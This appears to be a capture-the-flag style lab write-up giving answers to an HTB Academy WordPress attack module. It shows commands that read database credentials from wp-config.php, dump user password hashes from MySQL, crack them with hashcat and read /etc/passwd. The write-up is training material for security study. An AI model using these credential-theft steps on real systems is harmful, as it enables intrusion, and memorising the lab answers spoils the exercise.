# Section 04: Attacking Wordpress

Module: 24. Attacking Common Applications

---

## Questions & Answers

### 1. Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?

Context:
- Since i'm already in the web source code via `CVE-2020-24186`, seach for the database credentials:
```bash
> cat /var/www/blog.inlanefreight.local/wp-config.php
<SNIP>
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_dev' );

/** MySQL database username */
define( 'DB_USER', 'wordpressadm' );

/** MySQL database password */
define( 'DB_PASSWORD', 'HTB_@cademy_WP!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
<SNIP>
```
- Going in the database:
```bash
> mysql -u wordpressadm -p'HTB_@cademy_WP!' -h localhost wordpress_dev -e "SELECT ID, user_login, user_pass, user_email FROM wp_users;"


ID	user_login	user_pass	user_email
1	admin	$P$BypUJhi/0ZxCdoB7PRcr1M5Ab1tT/40	webadmin@inlanefreight.local
2	doug	$P$BZHe.XE/iW657LkgiZLgxSYrnMzqn4.	doug.douglas@inlanefreight.local
```

**Answer:** `doug`

---

### 2. Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.

Context:
- Know that the `rockyou.txt` is used to login brute-force so it should be available to crack these hashes:
```bash
cat > wp_hashes.txt << 'EOF'
$P$BypUJhi/0ZxCdoB7PRcr1M5Ab1tT/40
$P$BZHe.XE/iW657LkgiZLgxSYrnMzqn4.
EOF

hashcat -m 400 -a 0 wp_hashes.txt /usr/share/wordlists/rockyou.txt
<SNIP>
$P$BZHe.XE/iW657LkgiZLgxSYrnMzqn4.:jessica1               
<SNIP>
```
- It can just crack the `doug` password but that's all we need

**Answer:** `jessica1`

---

### 3. Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.

Context:
```bash
> cat /etc/passwd | grep "/bin/bash"


root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
webadmin:x:1001:1001::/home/webadmin:/bin/bash
```

**Answer:** `webadmin`

---

### 4. Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.

Context:
```bash


␦
> ls /var/www/blog.inlanefreight.local


flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
␦
> cat /var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt


l00k_ma_unAuth_rc3!
␦
```

**Answer:** `l00k_ma_unAuth_rc3!`

---


[Back to Module Index](./README.md)
